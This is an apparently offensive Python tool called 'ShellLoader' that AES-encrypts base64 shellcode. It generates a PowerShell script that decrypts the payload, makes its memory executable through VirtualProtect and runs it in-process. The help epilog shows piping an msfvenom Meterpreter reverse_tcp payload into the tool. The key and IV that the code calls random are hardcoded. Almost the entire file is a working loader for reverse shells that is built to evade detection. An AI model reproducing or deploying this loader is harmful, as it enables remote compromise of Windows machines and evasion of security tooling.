#!/usr/bin/env python3
import textwrap
from Crypto.Cipher import AES
import base64
import argparse
import os
import secrets
import time
import sys


def generate_random_key_iv():
    """Generate random 16-byte key and IV"""
    key = b"s3cr3tK3y1234567"
    iv = b"initvector123456"
    return key, iv

def encrypt_shellcode(shellcode, key, iv):
    """Encrypt the shellcode using AES-CBC"""
    raw_shellcode = base64.b64decode(shellcode)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # Padding to make the length a multiple of 16
    padding_length = 16 - (len(raw_shellcode) % 16)
    raw_shellcode += bytes([padding_length]) * padding_length
    
    encrypted_shellcode = cipher.encrypt(raw_shellcode)
    base64_encrypted_shellcode = base64.b64encode(encrypted_shellcode).decode()
    return base64_encrypted_shellcode

def generate_powershell_script(encrypted_shellcode, key, iv):
    """Generate the PowerShell reverse shell script"""
    # Convert key and IV to base64 for safe transmission
    key_b64 = base64.b64encode(key).decode()
    iv_b64 = base64.b64encode(iv).decode()
    
    ps_template = f'''Add-Type @"
using System;
using System.Runtime.InteropServices;

public class API {{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}}
"@

$encrypted = "{encrypted_shellcode}"


$key = [System.Text.Encoding]::UTF8.GetBytes("s3cr3tK3y1234567")
$iv = [System.Text.Encoding]::UTF8.GetBytes("initvector123456")


$AES = [System.Security.Cryptography.AES]::Create()
$AES.Key = $key
$AES.IV = $iv
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$decryptor = $AES.CreateDecryptor()
$encryptedBytes = [Convert]::FromBase64String($encrypted)

$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($encryptedBytes, 0, $encryptedBytes.Length)
$cs.Close()
$decryptedBytes = $ms.ToArray()

$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($decryptedBytes.Length)   
[System.Runtime.InteropServices.Marshal]::Copy($decryptedBytes, 0, $ptr, $decryptedBytes.Length)

$oldProtect = 0
[API]::VirtualProtect($ptr, $decryptedBytes.Length, 0x40, [ref]$oldProtect)

$execute = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [System.Action])
$execute.Invoke()

[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
Write-Host "Shellcode executed"
'''
    return ps_template

def loading(info):
    spinner = ['.', '..', '...', '....', '..... ok']

    for i in range(5):  
        sys.stdout.write(f'\r{info} {spinner[i]}') 
        sys.stdout.flush()
        time.sleep(0.4)
    print('')


def main():
    print(r'''   _____ _          _ _                     _            
  / ____| |        | | |                   | |          
 | (___ | |__   ___| | |     ___   __ _  __| | ___ _ __  
  \___ \| '_ \ / _ \ | |    / _ \ / _` |/ _` |/ _ \ '__|
  ____) | | | |  __/ | |___| (_) | (_| | (_| |  __/ |    
 |_____/|_| |_|\___|_|______\___/ \__,_|\__,_|\___|_| > By NulLD4y               
          ''')
    

    parser = argparse.ArgumentParser(description='Encrypt shellcode and generate PowerShell script', formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
                                                            
    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=7414 -f raw | base64 > b64rev
    $ python3 %(prog)s -f b64rev'''))

    parser.add_argument('-f', '--file', help='Input file containing base64 shellcode')
    parser.add_argument('-s', '--shellcode', help='Base64 shellcode string')
    parser.add_argument('-o', '--output', default='rev.ps1', help='Output PowerShell script file (default: rev.ps1)')
    
    args = parser.parse_args()
    
    if not (args.file or args.shellcode):
        parser.error("Either --file or --shellcode must be provided")
    
    # Read shellcode from file or use provided string
    if args.file:
        with open(args.file, 'r') as f:
            shellcode = f.read().strip()
    else:
        shellcode = args.shellcode.strip()
    
    # Generate random key and IV
    key, iv = generate_random_key_iv()
    
    # Encrypt the shellcode
    encrypted_shellcode = encrypt_shellcode(shellcode, key, iv)
    
    # Generate PowerShell script
    ps_script = generate_powershell_script(encrypted_shellcode, key, iv)
    
    
    loading('[+] Generating key')        
    
    print(f"\nGenerated Key: {key}")
    print(f"Generated IV: {iv}\n")

    loading('[+] Encrypting shellcode')
    print(f"[+] Encrypted shellcode:\n\n{encrypted_shellcode}\n")
    
    
    # Write to output file
    with open(args.output, 'w') as f:
        f.write(ps_script)

    print("[+] The final script has been saved to rev.ps1")


if __name__ == "__main__":
    main() 
